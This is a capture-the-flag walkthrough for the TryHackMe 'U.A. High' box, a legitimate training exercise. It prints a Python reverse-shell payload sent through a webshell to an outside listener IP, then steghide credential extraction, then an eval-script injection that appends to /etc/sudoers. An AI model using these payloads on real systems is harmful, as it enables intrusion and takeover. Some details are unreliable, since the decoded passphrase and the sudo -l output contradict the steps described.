💥 TryHackMe — U.A. High (Easy)

    Walkthrough by Digvijay Netke (netke)

🧠 Context

A brand new TryHackMe box dropped named "U.A. High". As an anime fan and aspiring hacker, I had to jump on it. Here's how I went from 0 to root, using webshells, steghide, and a vulnerable bash script.
🔎 Initial Enumeration
✅ Nmap Scan

nmap -sC -sV -Pn -T4 -p- -oA uahigh 10.10.34.14

🟢 Ports Open:

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache/2.4.41 (Ubuntu)

🌐 Web Recon

Navigated to:

http://10.10.34.14

Saw a basic U.A. High web page.
🔎 Fuzzed for Directories:

ffuf -u http://10.10.34.14/assets/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

Found:

    /assets/

    /assets/index.php

⚙️ Remote Code Execution

Visited:

http://10.10.34.14/assets/index.php

Blank page. Looked suspicious.
🧪 Tested for Web Shell:

http://10.10.34.14/assets/index.php?cmd=whoami

Boom 💥 — command injection confirmed.
Output was base64 encoded → typical webshell behavior.

Decoded base64 → got:

www-data

🪝 Reverse Shell
🛠 Payload used:

http://10.10.34.14/assets/index.php?cmd=python3+-c+"import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.17.63.152',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh'])"

📞 Listener setup:

nc -nvlp 1234

Connected as:

www-data@ip-10-10-34-14

Shell obtained ✅
📂 Looting for Credentials

Enumerated /home, /opt, /var/www/html/assets, etc.
🖼 Found:

oneforall.jpg

File looked broken — couldn’t open it properly.
🧪 File Analysis & Steg
🔍 Checked type:

file oneforall.jpg

→ data
⚠️ Corrupted image — fixed using hexedit / MagicBytes tool:

https://github.com/Haxrein/MagicBytes

Image became viewable — anime-themed image (cool but sus...)
🔐 Steghide

Tried:

steghide extract -sf oneforall.jpg

Prompted for passphrase.
💡 Found base64-encoded passphrase in Hidden_Content:

QWxsbWlnaHRmb3JFdmVyISE=

Decoded:

AllmightforEver!!!

✅ Extracted hidden content:

steghide extract -sf oneforall.jpg -p "AllmightforEver!!!"

Revealed:

username: deku
password: [REDACTED]

🔑 SSH as Deku

ssh deku@10.10.34.14

Got user shell ✅

cat user.txt

🔼 Privilege Escalation — Deku's Rise
🔍 Check Groups:

id

Found:

deku belongs to sudo

🔍 Check Sudo Permissions:

sudo -l

Output:

(ALL) /opt/NewComponent/feedback.sh
(root) NOPASSWD: ALL

    ⚠️ I could run feedback.sh as root!

💣 Vulnerable Script - feedback.sh

#!/bin/bash
read feedback
eval "echo $feedback"

Even with filters, it uses eval → easy RCE!
🛠 Exploit: Rewrite Sudoers

Ran:

sudo /opt/NewComponent/feedback.sh

Input:

deku ALL=NOPASSWD:ALL >> /etc/sudoers

Now deku has full sudo with no password.
🧨 Escalated to Root:

sudo su -

🏁 Final Flag:

cat /root/root.txt

ROOTED ✅
🧠 Summary
Step	Action
🔍	Enumerated open ports & found hidden web shell
🐚	Gained RCE via /assets/index.php?cmd=
📞	Sent reverse shell payload, got www-data
🖼	Found broken JPG → extracted with steghide
🔐	Used base64-encoded password: AllmightforEver!!!
🔑	Got SSH creds for deku
🔼	Used sudo-allowed feedback.sh with eval
🧨	Injected to write to /etc/sudoers
👑	Gained full root access via sudo su
